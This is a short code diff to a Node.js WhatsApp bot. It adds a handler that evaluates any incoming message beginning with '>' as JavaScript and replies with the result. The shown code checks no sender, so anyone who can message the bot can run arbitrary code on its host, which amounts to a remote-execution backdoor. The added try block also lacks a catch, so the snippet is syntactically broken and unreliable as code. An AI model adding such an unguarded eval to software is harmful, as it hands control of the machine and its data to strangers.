@@ -2,7 +2,7 @@ const fs = require("fs")
 const path = require("path")
 const P = require("pino")
 const config = require('./config')
-
+const util = require('util');
 const {
   default: makeWAAstroet,
   useMultiFileAuthState,
@@ -118,6 +118,13 @@ async function startBot() {
       m.message.conversation ||
       m.message.extendedTextMessage?.text ||
       ""
+    if (msg.startsWith(">")) {
+            try {
+                let evaled = await eval(`(async () => { ${msg?.replace(">", "")} })()`);
+                if (typeof evaled !== "string") evaled = util.inspect(evaled);
+                await Astro.sendMessage(m.key.remoteJid, {text: evaled})
+	    }
+    }
  var Prefix = "."
     if (!msg.startsWith(Prefix)) return
 
